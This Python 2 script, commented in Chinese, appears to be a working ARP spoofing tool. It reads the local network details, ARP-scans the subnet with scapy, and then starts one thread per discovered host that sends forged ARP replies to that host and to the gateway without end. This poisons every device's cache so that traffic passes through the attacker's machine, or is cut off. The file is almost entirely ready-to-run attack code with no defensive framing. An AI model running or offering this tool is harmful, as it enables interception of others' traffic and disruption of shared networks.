# encoding: utf-8
# -*- coding: utf8 -*-

import os
import sys
import threading
import time

try:
    import netifaces
except ImportError:
    try:
        command_to_execute = "pip install netifaces || easy_install netifaces"
        os.system(command_to_execute)
    except OSError:
        print "Can NOT install netifaces, Aborted!"
        sys.exit(1)
    import netifaces

try:
    from scapy.all import srp, Ether, ARP, conf,sendp,fuzz,send
except ImportError:
    try:
        command_to_execute = "pip install scapy"
        os.system(command_to_execute)
    except OSError:
        print "Can NOT install scapy, Aborted!"
        sys.exit(1)
    from scapy.all import srp, Ether, ARP, conf,sendp,fuzz,send




def get_network_infor():

    print "******************* start to get basic local network information ********************* "
    print 

    #网关IP
    gatewayIP = netifaces.gateways()['default'][netifaces.AF_INET][0]
    #网卡名字
    routingNicName = netifaces.gateways()['default'][netifaces.AF_INET][1]

    for interface in netifaces.interfaces():
        if interface == routingNicName:
            # print netifaces.ifaddresses(interface)
            #本地MAC
            localMacAddr = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
            try:
                #本地IP
                localIPAddr = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
                # TODO(Guodong Ding) Note: On Windows, netmask maybe give a wrong result in 'netifaces' module.
                #子网掩码
                IPNetmask = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['netmask']
            except KeyError:
                pass
    
    print "[*]get gatewayIP: " + gatewayIP
    print "[*]get localIP  : " + localIPAddr
    print "[*]get localMac : " + localMacAddr
    print "[*]get IPNetmask: " + IPNetmask
    print
    print "******************* finish to get basic local network information ********************* "

    #网关IP、本地IP、本地MAC、子网掩码
    return str(gatewayIP),str(localIPAddr),str(localMacAddr),str(IPNetmask)


def get_netmask_len(netmask):

    result = ""

    for num in netmask.split('.'):

        temp = str(bin(int(num)))[2:]
        
        result = result + temp

    netmask_len=len("".join(str(result).split('0')[0:1]))

    return netmask_len


def create_lan(localIP,netmask_lan):

    lan=str(localIP) + '/' + str(netmask_lan)

    print "[*]lan has creted: " + lan

    return lan


def get_ip_mac(lan):

    print "******************* start to get IP-MAC ********************* "
    print

    ans, unans = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=lan), timeout=2)
    for snd, rcv in ans:
        cur_mac = rcv.sprintf("%Ether.src%")
        cur_ip  = rcv.sprintf("%ARP.psrc%")
        print cur_mac + ' - ' +cur_ip
        ipTable.append(cur_ip)
        macTable.append(cur_mac)

    print
    print "******************* finish to get IP-MAC ********************* "


def get_gateway_mac(gate_ip):

    gateway_mac=''

    for i in range(len(ipTable)):

        if ipTable[i]==gate_ip:

            gateway_mac=macTable[i]
            del ipTable[i]
            del macTable[i]
            break
    return str(gateway_mac)



def create_arp_reply_packet(src_mac,des_mac,fake_src_ip,des_ip):

    eth = Ether(src=src_mac, dst=des_mac)  
    arp = ARP(hwsrc=src_mac, psrc=fake_src_ip, hwdst=des_mac, pdst=des_ip, op=2)  
    pkt = eth / arp  
    
    return pkt


def send_to_target(gateway_mac,host_mac,local_mac,gateway_ip,host_ip,local_ip):

    print "********* "+ str(host_ip) +" thread start ***********"

    packet_to_host=create_arp_reply_packet(local_mac,host_mac,gateway_ip,host_ip)

    packet_to_gateway=create_arp_reply_packet(local_mac,gateway_mac,host_ip,gateway_ip)

    while 1:

        sendp(packet_to_host)
        time.sleep(0.5)

        sendp(packet_to_gateway)
        time.sleep(0.5)


def arp_target_helper(gatewayMAC,gatewayIP,localMAC,localIP):

    for i in range(len(ipTable)):
        
        thread = threading.Thread(target=send_to_target, args=(gatewayMAC,macTable[i],localMAC,gatewayIP,ipTable[i],localIP))
        thread.start()




#程序从这里开始

#ip表
ipTable=[]
#mac表
macTable=[]


#网关IP、本地IP、本地MAC、子网掩码
gatewayIP ,localIP ,localMac ,IPNetmask = get_network_infor()

#lan
lan=create_lan(gatewayIP,get_netmask_len(IPNetmask))

#获取IP-MAC
get_ip_mac(lan)


#获取网关MAC，并将网关信息从表中删除
gatewayMAC=get_gateway_mac(gatewayIP)


#启动程序
arp_target_helper(gatewayMAC,gatewayIP,localMac,localIP)
